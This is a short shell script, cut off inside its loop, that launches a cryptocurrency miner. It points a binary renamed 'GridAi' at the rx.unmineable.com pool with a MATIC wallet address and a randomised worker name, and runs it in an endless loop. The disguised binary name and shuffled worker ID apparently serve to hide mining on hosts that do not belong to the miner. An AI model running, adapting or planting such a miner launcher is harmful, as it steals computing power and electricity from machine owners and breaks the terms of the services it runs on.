POOL=rx.unmineable.com:3333
WALLET=MATIC:0xb0861cDc09dC09e7C33cFCcE2Da16c07cEFEbBbC
WORKER=$(echo $(shuf -i 10-40 -n 1)-X)
a=chukwa
while [ 1 ]; do
  sleep 5
  ./GridAi --algorithm $a --pool $POOL --username $WALLET.$WORKER 
